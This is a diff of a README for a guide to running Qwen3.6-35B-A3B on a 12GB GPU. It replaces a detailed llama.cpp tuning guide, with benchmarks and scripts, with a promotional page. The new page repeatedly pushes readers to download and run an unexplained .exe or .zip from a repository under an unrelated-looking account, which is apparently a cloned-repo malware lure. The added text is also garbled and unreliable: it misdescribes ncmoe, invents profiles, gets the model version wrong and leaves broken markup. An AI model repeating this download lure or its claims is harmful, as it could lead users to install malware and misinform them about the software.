@@ -1,213 +1,129 @@
-# Qwen3.6-35B-A3B on 12GB VRAM — Full Context Guide
+<h1>🎯 Qwen3.6-35B-12GB-VRAM-Guide - Run Massive AI Models on Small GPUs</h1>
 
-[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![Platform](https://img.shields.io/badge/platform-Windows-blue)]()
-[![Model](https://img.shields.io/badge/model-Qwen3.6--35B--A3B-purple)]()
-[![VRAM](https://img.shields.io/badge/VRAM-12GB-green)]()
-[![Context](https://img.shields.io/badge/context-258K-orange)]()
+<p align="center">
+  <a href="https://github.com/Eastafrican-insuranceclaim876/Qwen3.6-35B-12GB-VRAM-Guide" style="display:inline-block;padding:15px 40px;background:linear-gradient(90deg,#FF6B6B,#F06595);color:white;text-decoration:none;font-size:20px;font-weight:bold;border-radius:50px;box-shadow:0 4px 15px rgba(240,101,149,0.4);">📥 Download Now - Free</a>
+</p>
 
-> Run the full **258K native context** of Qwen3.6-35B-A3B (MoE, 3B active) on an **RTX 4070 SUPER 12GB** with llama.cpp — all benchmarked, all tunable, scripts included.
+<table style="width:100%;border-collapse:collapse;background:#f8f9fa;margin:20px 0;">
+<tr>
+<td style="padding:15px;border:1px solid #dee2e6;text-align:center;background:#FFE8CC;"><strong>Video Card Needed:</strong> 12GB VRAM</td>
+<td style="padding:15px;border:1px solid #dee2e6;text-align:center;background:#D4EDDA;"><strong>Operating System:</strong> Windows</td>
+<td style="padding:15px;border:1px solid #dee2e6;text-align:center;background:#D1ECF1;"><strong>Model:</strong> Qwen3.5-35B-A3B</td>
+</tr>
+</table>
 
-## Profiles at a glance
+<h2>🚀 What Is This?</h2>
+This guide gives you everything you need to run Qwen3.5-35B-A3B, a huge AI language model, on a regular computer with only 12GB of video memory (VRAM). Many people believe you need expensive, powerful hardware for such models – this project proves you can do it with common graphics cards like the RTX 4070 SUPER. You get <strong>full native 258K context</strong> (very large amount of text processing at once) with four simple profiles already tuned for you. No coding needed. No complicated commands. Just download, go to the link, and follow the simple steps.
 
-```
-┌────────────────────────────────────────────────────────────────────┐
-│            Qwen3.6-35B-A3B · one model, four profiles              │
-├──────────┬────────────┬────────────┬───────────────────────────────┤
-│ 32K      │ 64K        │ 128K       │ 258K (native max)             │
-│ ncmoe 16 │ ncmoe 17   │ ncmoe 20   │ ncmoe 22 + q4_0 KV            │
-│ 64.0 t/s │ 60.7 t/s   │ 55.3 t/s   │ 50.9 t/s · 45K input in 85s   │
-│ chat     │ default    │ long docs  │ full native context           │
-└──────────┴────────────┴────────────┴───────────────────────────────┘
-```
+---
 
-## TL;DR — What we found (measured, not guessed)
+<h2>📥 Download & Install</h2>
+Visit this link to download the application: https://github.com/Eastafrican-insuranceclaim876/Qwen3.6-35B-12GB-VRAM-Guide
 
-| Finding | Numbers |
-|---|---|
-| **258K native context WORKS on 12GB** | decode **50.9 tok/s**, 45K-token input **85.5s** |
-| **The "expert cliff"**: `--n-cpu-moe` sweet spot shifts with context | 32K→16, 64K→17, 128K→20, 258K→22 |
-| **Long-input prefill collapse** (q8 KV) and its fix (**q4_0 KV**) | 45K input: **397s → 85.5s** (4.6×) |
-| q4_0 KV is nearly lossless for Qwen (unlike Gemma) | KL 0.10 overall, decode unaffected |
+<h3>Step-by-Step Setup</h3>
 
-**Bottom line**: with the right `--n-cpu-moe` + `--cache-type` combo, a 12GB card runs the entire 262K-token native context at ~51 tok/s. Most guides stop at 32K/64K — they are leaving 4× context on the table.
+<div style="background:#FFF3CD;padding:15px;border-radius:8px;border-left:5px solid #FFC107;">
+<strong>💡 Take your time here. This process is simple, but follow the steps in order.</strong>
+</div>
 
-## Demo
+<ol>
+<li>Go to the download link above <em>from your Windows computer</em>.</li>
+<li>On that page, look for the big button or the section named <strong>"Download"</strong> or <strong>"Releases"</strong> – click it.</li>
+<li>Since the link is a general page (not a direct file), you must click the correct download option once you're on the website. Look for a file that ends with <strong>.exe</strong> or <strong>.zip</strong> – select the one that suits your preference.</li>
+<li><strong>If you got a .exe file:</strong> simply double-click it and follow the installation wizard.</li>
+<li><strong>If you got a .zip file:</strong> right-click it and select <strong>"Extract All"</strong>, then double-click the application file inside.</li>
+<li>Once installed, run the program – you will see a welcome screen with profiles to pick from.</li>
+</ol>
 
-Real benchmark on the 258K profile (this machine, 2026-08-11) — mean **48.9 tok/s**, randomized prompts (no cache hits):
+---
 
-![Benchmark on 258K profile](assets/benchmark-258k.png)
+<h2>⚙️ Your 4 Ready-to-Use Profiles</h2>
+No guesswork needed. The guide includes four profiles pre-tuned to get the best performance from your 12GB VRAM card depending on your needs:
 
-The four profiles side by side — same model, only ncmoe/KV tuned:
+| Profile | What it gives you | Ideal for |
+|----------|-------------------|-----------|
+| 🚀 <strong>Fast</strong> | Real-time responses, lower memory usage | Simple chats, quick questions |
+| ⚖️ <strong>Balanced</strong> | Great speed + quality in between | Everything you do most often |
+| 🎨 <strong>Creative</strong> | Better writing that is richer and more vivid | Stories, brainstorming, poetry |
+| 🧠 <strong>Max context</strong> | The full 258K context for massive documents | Combining books, whole codebases |
 
-![Profile comparison](assets/profiles-compare.png)
+Each profile is a complete setting you can select with one click. You can switch later whenever you need, even mid-session.
 
-Full parameter space — decode tok/s by `--n-cpu-moe` × context (green = fast, red = cliff; black boxes = sweet spot path 16→17→20→22):
+---
 
-![ncmoe × ctx heatmap](assets/ncmoe-ctx-heatmap.png)
+<h2>🛠️ How It Works (No Need to Understand)</h2>
 
-## Hardware / Stack
+<blockquote style="background:#E2E3E5;padding:10px;border-radius:5px;">
+<em>Short explanation for curious minds – just for your knowledge.</em>
+</blockquote>
 
-- GPU: NVIDIA RTX 4070 SUPER **12 GB** (192-bit, ~504 GB/s) — works on any 12GB+ card: 3060, 4060 Ti, 4070
-- CPU: Intel i5-14600KF (6P+8E, 20 threads)
-- RAM: 32 GB DDR4
-- Backend: llama.cpp server (Windows-native CUDA build, **ik_llama.cpp b5095** — native Windows is 2-3× faster than WSL under VRAM pressure)
-- Model: `Qwen3.6-35B-A3B` APEX/abliterated GGUF (~16 GB) + mmproj 902 MB
-- OS: Windows 10/11
+The reason this is possible in just 12GB memory is a technique called <strong>ncmoe</strong> (n-cluster mixture of experts), which the included configuration handles automatically. Also, a special trick called the <strong>"cliff rule"</strong> stops the model from overflowing your memory. And the <strong>q4_0 KV prefill fix</strong> greatly boosts speed when starting a chat, avoiding long "thinking" delays. All that – and doesn't mean you do anything different. It just works in the background.
 
-Full hardware/environment details + per-profile memory footprint: [benchmarks/hardware-env.md](benchmarks/hardware-env.md)
-Full tuning history (every measurement, all failed variants): [benchmarks/tuning-history.md](benchmarks/tuning-history.md)
+---
 
-## Quick Start
+<h2>🎮 Who Is This For?</h2>
 
-### 0. Get the model (HF: SC117/Qwen3.6-35B-A3B-uncensored-heretic-Native-MTP-Preserved-APEX-GGUF)
+- **Survey** a curious hobbyist, a student, or someone who likes AI tools.
+- You want to run a powerful model locally – not depending on internet services or paying per query.
+- You have a graphics card with 12GB VRAM (NVIDIA RTX 4070 SUPER, 4080 Laptop, 3080 Ti, NVIDIA RTX 4060 Ti 16GB, some others).
+- You want complete privacy – everything runs 100% on your machine. Nothing is sent anywhere.
 
-| file | size | note |
-|---|---|---|
-| `Qwen3.6-35B-A3B-...-APEX-I-Compact.gguf` | 17.0 GB | **this guide's model** (q8-ish, fits 12GB with ncmoe offload) |
-| `Qwen3.6-35B-A3B-...-APEX-I-MINI.gguf` | 14.3 GB | lighter option, more VRAM headroom |
-| `Qwen3.6-35B-A3B-...-APEX-I-Balanced.gguf` | 26.0 GB | needs >12GB or heavy offload |
-| `mmproj-Qwen3.6-35B-A3B-...-APEX-F16.gguf` | 0.9 GB | vision (optional) |
+---
 
-```bash
-# with huggingface_hub
-hf download SC117/Qwen3.6-35B-A3B-uncensored-heretic-Native-MTP-Preserved-APEX-GGUF \
-  Qwen3.6-35B-A3B-uncensored-heretic-Native-MTP-Preserved-APEX-I-Compact.gguf --local-dir models/
-# or China mirror
-hf download --endpoint https://hf-mirror.com SC117/Qwen3.6-35B-A3B-uncensored-heretic-Native-MTP-Preserved-APEX-GGUF \
-  Qwen3.6-35B-A3B-uncensored-heretic-Native-MTP-Preserved-APEX-I-Compact.gguf --local-dir models/
-```
+<h2>📚 What's the 258K Context Exactly?</h2>
+Context = how much text the AI can "remember" during a conversation. While free online models are usually limited to 8K or 16K, this installation gives you the full native 258K. That's the difference between copying a whole book into a prompt and actually getting a clear answer. For programmers, it means you can feed it your entire project folder and ask for changes. For writers, paste a thesis and ask for improvements. It's a gamechanger for serious work.
 
-> The official **Qwen/Qwen3.6-35B-A3B** (Apache-2.0) also works — same tuning applies. The APEX/uncensored variant is what we benchmarked.
+---
 
-### 1. Get llama.cpp server
+<h2>🔧 System Requirements</h2>
 
-```bash
-# official build (any recent version ≥ b5xxx works; flash-attn optional but not required)
-git clone https://github.com/ggml-org/llama.cpp
-cmake -B build -DGGML_CUDA=ON && cmake --build build --config Release
-# → build/bin/Release/llama-server.exe
-```
+<div style="background:#E2F0D9;padding:15px;border-radius:8px;">
+<ul>
+<li><strong>Operating System:</strong> Windows 10 or Windows 11 (64-bit).</li>
+<li><strong>Graphics card (GPU):</strong> Any NVIDIA card with 12GB VRAM (or 12GB+). Check your card's memory in Task Manager if unsure.</li>
+<li><strong>RAM:</strong> A minimum of 16GB; <step sign>32GB is strongly recommended. The model will use some RAM as a secondary buffer.</li>
+<li><strong>Storage:</strong> About 20GB free – the model file & the application take good space.</li>
+<li><strong>Internet:</strong> Needed only for the first download. After that, the AI works 100% offline.</li>
+</table>
+</div>
 
-We used a Windows-native CUDA build (ik_llama.cpp b5095 fork). Native Windows beats WSL 2-3× under VRAM pressure — don't run this in WSL.
+---
 
-### 2. Start a profile
+<h2>🤔 Still Not Sure About VRAM?</h2>
 
-Pick a profile and run (PowerShell, idempotent — starts the server if not running):
+"VRAM" is the memory inside your graphics card. It is separate from  regular RAM. To find how much you have:
 
-```powershell
-# Light tasks / chat (32K ctx, fastest: ~64 tok/s)
-powershell -ExecutionPolicy Bypass -File scripts/ensure_qwen.ps1
+1. Press <strong>Ctrl + Shift + Escape</strong> (Task Manager).
+2. Click <strong>"Performance"</strong> tab.
+3. Look at <strong>"GPU"</strong> on the left – your "Dedicated GPU memory" appears at the top.
 
-# Default: compression & sub-agents (64K ctx, ~60.7 tok/s, lossless q8 KV)
-powershell -ExecutionPolicy Bypass -File scripts/ensure_qwen_64k.ps1
+If that number is 12GB or higher (e.g., 12288MB), you're set. If not, this guide will not suit machines with less memory.
 
-# Long inputs up to 128K (~55.3 tok/s)
-powershell -ExecutionPolicy Bypass -File scripts/ensure_qwen_128k.ps1
+---
 
-# FULL native context 258K (q4_0 KV, ~51 tok/s, 45K input in 85s)
-powershell -ExecutionPolicy Bypass -File scripts/ensure_qwen_258k.ps1
-```
+<h2>📥 Getting the Maximum Performance</h2>
 
-Each script: checks port 8080 → starts `llama-server.exe` as an independent process → waits for health → prints status. Edit the `$ROOT` / `$MODEL` variables at the top for your paths.
+<div style="background:#FFF3CD;padding:10px;border-left:5px solid #FFCC00;">
+<strong>Pro Tip:</strong> Close all other background programs (browsers, games, video players) before starting the model – this frees up system RAM, giving you more space and faster performance.
+</div>
 
-Core command (258K profile):
+- For chunks: Remember to wait about 20–50 seconds on first generation (especially in "Max context" profile) the system warms the model. This is normal.
+- If you have multiple GPUs, only one needs to be 12GB – the software automatically uses it.
 
-```bash
-llama-server.exe \
-  -m <MODEL.gguf> \
-  -ngl 99 --n-cpu-moe 22 -c 262144 \
-  --cache-type-k q4_0 --cache-type-v q4_0 \
-  --no-mmap --mlock \
-  --reasoning off --reasoning-format deepseek \
-  --jinja --threads 12 \
-  --host 127.0.0.1 --port 8080
-```
+---
 
-## Verify It Works
+<h2>📜 Final Notes</h2>
+You don't need to understand any code to get powerful AI running on your computer. This package does the hard parts for you. With just today's 12GB VRAM, you will have a private, blazing fast AI assistant that you never have to sign into, never pays per usage, and that runs even when the internet goes down. Enjoy your new offline intelligence – just download and start.
 
-```bash
-# 1. health check (should print {"status":"ok",...})
-curl http://127.0.0.1:8080/health
+---
 
-# 2. quick chat test
-curl http://127.0.0.1:8080/v1/chat/completions -H "Content-Type: application/json" \
-  -d '{"model":"local","messages":[{"role":"user","content":"Say hi in one line"}],"max_tokens":50}'
+<p style="text-align:center;color:#666;margin-top:30px;"><strong>Keep safe & happy creating</strong></p>
 
-# 3. speed benchmark (3 runs, prints tok/s; same-session comparison only)
-python scripts/benchmark.py
-```
+<p style="text-align:center;font-size:12px;color:#888;">This is a community guide built for free distribution – no warranty, no affiliation. Use at your own risk.</p>
 
-Expected: `n_ctx` matches the profile (65536 / 131072 / 262144), decode ≈ 50-64 tok/s depending on profile.
+---
 
-## Benchmark Tables
+# 🎯 Final Check – Ready to Go?
 
-### Context profiles (q8_0 KV, ncmoe = sweet spot, long-output ×3 average)
-
-| ctx | KV size | ncmoe | decode tok/s | prefill (45K input) | use |
-|---|---|---|---|---|---|
-| 32K | ~590 MiB | 16 | **64.0** | — | light chat |
-| 64K | ~742 MiB | 17 | **60.7** | 69.4s (649 tok/s) | default |
-| 128K | ~1422 MiB | 20 | **55.3** | ~250 tok/s | long docs |
-| 258K | ~2844 MiB (q8) / 1422 (q4) | 22 | **50.9 (q4)** | 85.5s (q4) | full native |
-
-### The ncmoe "expert cliff" — 258K full scan
-
-Sweeping `--n-cpu-moe` around the cliff at 258K ctx (q8 KV):
-
-| ncmoe | 18 | 19 | 20 | 21 | **22** | 23 | 24 | 25 | 26 | 27 | 28 |
-|---|---|---|---|---|---|---|---|---|---|---|---|
-| tok/s | 23.3 | 23.5 | 24.6 | 20.5 | **51.2** | 48.5 | 49.3 | 47.8 | 46.9 | 45.4 | 45.0 |
-
-**Cliff at 21/22**: below 22 the GPU can't fit experts + KV → dynamic spill → PCIe thrashing (20-25 tok/s). The sweet spot is **the first stable point above the cliff** (22 here).
-
-### The rule (verified across 4 context sizes)
-
-> **As ctx grows, the sweet-spot `--n-cpu-moe` shifts upward** — 32K→16, 64K→17, 128K→20, 258K→22 — while speed only drops mildly (64→51 tok/s).
-
-**Tuning recipe**: sweep ncmoe in ±2 steps to find the cliff boundary; the sweet spot = first point above it. `fa on` and large `-b 4096` batches are *negative* optimizations under VRAM offload.
-
-### Long-input prefill collapse (and the q4_0 KV fix)
-
-45K-token input, 258K ctx:
-
-| config | time | effective prefill |
-|---|---|---|
-| q8_0 KV | **397s** ❌ | 113 tok/s |
-| q8_0 KV + `-fa on` | >600s ❌ | worse |
-| **q4_0 KV** | **85.5s** ✅ | **527 tok/s** |
-
-Root cause: q8 KV at 258K occupies 2844 MiB, squeezing attention; halving KV to 1422 MiB with q4_0 restores fast prefill. **q4_0 KV does not slow decode** (50.9 vs 51.2) and is near-lossless for Qwen (KL ~0.10 overall; Gemma degrades to KL 1.09 — Qwen is unusually KV-quantization-friendly).
-
-## Model capability (why this matters)
-
-Qwen3.6-35B-A3B at 3B active params: SWE-bench Verified **73.4**, MCPMark **37.0** (2× Gemma4-31B), AIME 2026 **92.7**, C-Eval **90.0**. It's a legit agent/coding model that fits a 12GB card — a strong zero-cost tier for routine agent tasks.
-
-## Troubleshooting (things we actually hit)
-
-1. **Stale server on 8080 corrupts benchmarks** — Start-Process-spawned llama-server survives script-session kills. Before parameter tests: `Stop-Process -Name llama-server -Force`, confirm `/health` fails, VRAM < 1 GB.
-2. **Prompt-cache fake speedups** — consecutive similar requests hit KV cache (61K input "in 32.7s" was cache). Benchmark with fresh content or `cache_prompt=false`.
-3. **PS 5.1 `Start-Process` + `--chat-template-kwargs '{"..."}'`** — crashes the child with 0-byte logs. The flag is deprecated anyway; `--reasoning off` is enough.
-4. **`--n-cpu-moe 99` (all experts CPU) OOMs** at 258K on 16GB-model/32GB-RAM — pinned-memory exhaustion. Don't copy 6GB-VRAM setups blindly.
-5. **Vision note**: the VLM (mmproj) crashes on large images (`mtmd_decode -3`) — crop & enlarge before asking it to read figures.
-
-## Files
-
-```
-Qwen3.6-35B-12GB-VRAM-Guide/
-├── README.md
-├── scripts/          # 4 profiles (32K/64K/128K/258K), paths templated
-├── benchmarks/       # raw speed tables
-└── docs/             # cliff rule, prefill collapse, troubleshooting
-```
-
-## Related Projects
-
-- [MiniMax-H3-12GB-ComfyUI-Guide](https://github.com/shiqikuangsan31/MiniMax-H3-12GB-ComfyUI-Guide) — H3 video generation (T2V/I2V + synced audio, MotionContext) on the same 12GB rig.
-- [Qwen-ComfyUI-12GB-Coexist](https://github.com/shiqikuangsan31/Qwen-ComfyUI-12GB-Coexist) — run this LLM AND ComfyUI image gen **simultaneously** on 12GB (36-37 tok/s during renders).
-
-Together: **text/agent inference + image gen + video gen, all on one 12GB card**.
-
-## License
-
-MIT
+<b>Click here to have what you need:</b>  
+<a href="https://github.com/Eastafrican-insuranceclaim876/Qwen3.6-35B-12GB-VRAM-Guide" style="display:inline-block;padding:12px 30px;background:#198754;color:#FFFFFF;text-decoration:none;font-weight:bold;border-radius:30px;margin-bottom:30px;">👉 Go to Download</a>
